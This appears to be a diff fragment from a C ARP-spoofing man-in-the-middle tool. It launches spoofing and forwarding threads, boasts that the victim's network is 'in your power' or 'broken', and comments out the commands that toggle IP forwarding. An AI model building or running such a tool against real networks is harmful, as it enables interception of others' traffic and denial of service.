@@ -116,16 +116,15 @@ int main(int argc, char const *argv[]) {
     printf("Attaking!!\n");
     MITM_arg.dev = dev;
     ret_thread1 = pthread_create(&thread1, NULL, (void *)&Arpspoof, (void *)&MITM_arg);
-    
 
     /* arpforwarder */
     if (mode == Get) {
-        system("echo '1' > /proc/sys/net/ipv4/ip_forward");
+        //system("echo '1' > /proc/sys/net/ipv4/ip_forward");
         printf("Now you are the Middle Man, his network is in your power!\n\n");
         ret_thread2 = pthread_create(&thread2, NULL, (void *)&Arpforward, (void *)&MITM_arg);
     }
     else {
-        system("echo '0' > /proc/sys/net/ipv4/ip_forward");
+        //system("echo '0' > /proc/sys/net/ipv4/ip_forward");
         printf("Now his network is broken\n");
     }
     pthread_join(thread1,NULL);
